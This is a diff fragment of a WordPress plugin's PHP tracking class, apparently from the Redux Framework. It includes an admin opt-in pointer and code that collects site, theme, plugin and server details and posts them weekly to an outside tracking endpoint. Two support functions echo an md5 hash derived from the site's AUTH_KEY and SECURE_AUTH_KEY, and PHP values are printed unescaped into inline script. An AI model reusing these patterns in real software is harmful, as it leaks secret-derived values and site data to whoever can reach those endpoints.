+                                                }
+                                            );
+                                            return button;
+                                        },
+                                        close: function() {
+                                        }
+                                    }
+                                );
+
+                                setup = function() {
+                                    $( '<?php echo $selector; ?>' ).pointer( redux_pointer_options ).pointer( 'open' );
+                                    <?php if ($button2) { ?>
+                                    jQuery( '#pointer-close' ).after( '<a id="pointer-primary" class="button-primary">' + '<?php echo $button2; ?>' + '</a>' );
+                                    jQuery( '#pointer-primary' ).click(
+                                        function() {
+                                            <?php echo $button2_function; ?>
+                                        }
+                                    );
+                                    jQuery( '#pointer-close' ).click(
+                                        function() {
+                                            <?php if ($button1_function == '') { ?>
+                                            redux_store_answer( input, nonce )
+                                            //redux_setIgnore("tour", "wp-pointer-0", "<?php echo wp_create_nonce('redux-ignore'); ?>");
+                                            <?php } else { ?>
+                                            <?php echo $button1_function; ?>
+                                            <?php } ?>
+                                        }
+                                    );
+                                    <?php } else if ($button1 && !$button2) { ?>
+                                    jQuery( '#pointer-close' ).click(
+                                        function() {
+                                            <?php if ($button1_function != '') { ?>
+                                            <?php echo $button1_function; ?>
+                                            <?php } ?>
+                                        }
+                                    );
+                                    <?php } ?>
+                                };
+
+                                if ( redux_pointer_options.position && redux_pointer_options.position.defer_loading )
+                                    $( window ).bind( 'load.wp-pointers', setup );
+                                else
+                                    $( document ).ready( setup );
+                            }
+                        );
+                    })( jQuery );
+                    //]]>
+                </script>
+            <?php
+            }
+
+            function trackingObject() {
+                global $blog_id, $wpdb;
+                $pts = array();
+
+                foreach ( get_post_types( array( 'public' => true ) ) as $pt ) {
+                    $count      = wp_count_posts( $pt );
+                    $pts[ $pt ] = $count->publish;
+                }
+
+                $comments_count = wp_count_comments();
+                $theme_data     = wp_get_theme();
+                $theme          = array(
+                    'version'  => $theme_data->Version,
+                    'name'     => $theme_data->Name,
+                    'author'   => $theme_data->Author,
+                    'template' => $theme_data->Template,
+                );
+
+                if ( ! function_exists( 'get_plugin_data' ) ) {
+                    require_once( ABSPATH . 'wp-admin/includes/admin.php' );
+                }
+
+                $plugins = array();
+                foreach ( get_option( 'active_plugins', array() ) as $plugin_path ) {
+                    $plugin_info = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin_path );
+
+                    $slug             = str_replace( '/' . basename( $plugin_path ), '', $plugin_path );
+                    $plugins[ $slug ] = array(
+                        'version'    => $plugin_info['Version'],
+                        'name'       => $plugin_info['Name'],
+                        'plugin_uri' => $plugin_info['PluginURI'],
+                        'author'     => $plugin_info['AuthorName'],
+                        'author_uri' => $plugin_info['AuthorURI'],
+                    );
+                }
+                if ( is_multisite() ) {
+                    foreach ( get_option( 'active_sitewide_plugins', array() ) as $plugin_path ) {
+                        $plugin_info      = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin_path );
+                        $slug             = str_replace( '/' . basename( $plugin_path ), '', $plugin_path );
+                        $plugins[ $slug ] = array(
+                            'version'    => $plugin_info['Version'],
+                            'name'       => $plugin_info['Name'],
+                            'plugin_uri' => $plugin_info['PluginURI'],
+                            'author'     => $plugin_info['AuthorName'],
+                            'author_uri' => $plugin_info['AuthorURI'],
+                        );
+                    }
+                }
+
+
+                $version = explode( '.', PHP_VERSION );
+                $version = array(
+                    'major'   => $version[0],
+                    'minor'   => $version[0] . '.' . $version[1],
+                    'release' => PHP_VERSION
+                );
+
+                $user_query     = new WP_User_Query( array( 'blog_id' => $blog_id, 'count_total' => true, ) );
+                $comments_query = new WP_Comment_Query();
+                $data           = array(
+                    '_id'       => $this->options['hash'],
+                    'localhost' => ( $_SERVER['REMOTE_ADDR'] === '127.0.0.1' ) ? 1 : 0,
+                    'php'       => $version,
+                    'site'      => array(
+                        'hash'      => $this->options['hash'],
+                        'version'   => get_bloginfo( 'version' ),
+                        'multisite' => is_multisite(),
+                        'users'     => $user_query->get_total(),
+                        'lang'      => get_locale(),
+                        'wp_debug'  => ( defined( 'WP_DEBUG' ) ? WP_DEBUG ? true : false : false ),
+                        'memory'    => WP_MEMORY_LIMIT,
+                    ),
+                    'pts'       => $pts,
+                    'comments'  => array(
+                        'total'    => $comments_count->total_comments,
+                        'approved' => $comments_count->approved,
+                        'spam'     => $comments_count->spam,
+                        'pings'    => $comments_query->query( array( 'count' => true, 'type' => 'pingback' ) ),
+                    ),
+                    'options'   => apply_filters( 'redux/tracking/options', array() ),
+                    'theme'     => $theme,
+                    'redux'     => array(
+                        'mode'      => ReduxFramework::$_is_plugin ? 'plugin' : 'theme',
+                        'version'   => ReduxFramework::$_version,
+                        'demo_mode' => get_option( 'ReduxFrameworkPlugin' ),
+                    ),
+                    'developer' => apply_filters( 'redux/tracking/developer', array() ),
+                    'plugins'   => $plugins,
+                );
+
+                $parts    = explode( ' ', $_SERVER['SERVER_SOFTWARE'] );
+                $software = array();
+                foreach ( $parts as $part ) {
+                    if ( $part[0] == "(" ) {
+                        continue;
+                    }
+                    if ( strpos( $part, '/' ) !== false ) {
+                        $chunk                               = explode( "/", $part );
+                        $software[ strtolower( $chunk[0] ) ] = $chunk[1];
+                    }
+                }
+                $software['full']    = $_SERVER['SERVER_SOFTWARE'];
+                $data['environment'] = $software;
+                if ( function_exists( 'mysql_get_server_info' ) ) {
+                    $data['environment']['mysql'] = mysql_get_server_info();
+                }
+                if ( empty( $data['developer'] ) ) {
+                    unset( $data['developer'] );
+                }
+
+                return $data;
+            }
+
+            /**
+             * Main tracking function.
+             */
+            function tracking() {
+                // Start of Metrics
+                global $blog_id, $wpdb;
+
+                $data = get_transient( 'redux_tracking_cache' );
+                if ( ! $data ) {
+
+                    $args = array(
+                        'body' => $this->trackingObject()
+                    );
+
+                    $response = wp_remote_post( 'https://redux-tracking.herokuapp.com', $args );
+
+                    // Store for a week, then push data again.
+                    set_transient( 'redux_tracking_cache', true, WEEK_IN_SECONDS );
+                }
+            }
+
+            function tracking_arg() {
+                echo md5( AUTH_KEY . SECURE_AUTH_KEY . '-redux' );
+                die();
+            }
+
+            function support_args() {
+                header( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
+                header( "Last-Modified: " . gmdate( "D, d M Y H:i:s" ) . "GMT" );
+                header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' );
+                header( 'Cache-Control: no-store, no-cache, must-revalidate' );
+                header( 'Cache-Control: post-check=0, pre-check=0', false );
+                header( 'Pragma: no-cache' );
+                $instances = ReduxFrameworkInstances::get_all_instances();
+
+                if ( isset( $_REQUEST['i'] ) && ! empty( $_REQUEST['i'] ) ) {
+                    if ( is_array( $instances ) && ! empty( $instances ) ) {
+                        foreach ( $instances as $opt_name => $data ) {
+                            if ( md5( $opt_name . '-debug' ) == $_REQUEST['i'] ) {
+                                $array = $instances[ $opt_name ];
+                            }
+                        }
+                    }
+                    if ( isset( $array ) ) {
+                        if ( isset( $array->extensions ) && is_array( $array->extensions ) && ! empty( $array->extensions ) ) {
+                            foreach ( $array->extensions as $key => $extension ) {
+                                if ( isset( $extension->$version ) ) {
+                                    $array->extensions[ $key ] = $extension->$version;
+                                } else {
+                                    $array->extensions[ $key ] = true;
+                                }
+                            }
+                        }
+                        if ( isset( $array->import_export ) ) {
+                            unset( $array->import_export );
+                        }
+                        if ( isset( $array->debug ) ) {
+                            unset( $array->debug );
+                        }
+                    } else {
+                        die();
+                    }
+
+                } else {
+                    $array = $this->trackingObject();
+                    if ( is_array( $instances ) && ! empty( $instances ) ) {
+                        $array['instances'] = array();
+                        foreach ( $instances as $opt_name => $data ) {
+                            $array['instances'][] = $opt_name;
+                        }
+                    }
+                    $array['key'] = md5( AUTH_KEY . SECURE_AUTH_KEY );
+                }
+
+                echo @json_encode( $array, true );
+                die();
+            }
+
+        }
+
+        Redux_Tracking::get_instance();
+
+        /**
+         * Adds tracking parameters for Redux settings. Outside of the main class as the class could also be in use in other ways.
+         *
+         * @param array $options
+         *
+         * @return array
+         */
+        function redux_tracking_additions( $options ) {
+            $opt = array();
+
+            $options['redux'] = array(
+                'demo_mode' => get_option( 'ReduxFrameworkPlugin' ),
+            );
+
+            return $options;
+        }
+
+        add_filter( 'redux/tracking/options', 'redux_tracking_additions' );
+
+        function redux_allow_tracking_callback() {
+            // Verify that the incoming request is coming with the security nonce
+            if ( wp_verify_nonce( $_REQUEST['nonce'], 'redux_activate_tracking' ) ) {
+                $options = get_option( 'redux-framework-tracking' );
+
+                if ( $_REQUEST['allow_tracking'] == "tour" ) {
+                    $options['tour'] = 1;
+                } else {
+                    $options['allow_tracking'] = $_REQUEST['allow_tracking'];
+                }
+
+                if ( update_option( 'redux-framework-tracking', $options ) ) {
+                    die( '1' );
+                } else {
+                    die( '0' );
+                }
+            } else {
+                // Send -1 if the attempt to save via Ajax was completed invalid.
+                die( '-1' );
+            } // end if
+        }
+
+        add_action( 'wp_ajax_redux_allow_tracking', 'redux_allow_tracking_callback' );
+
+    }
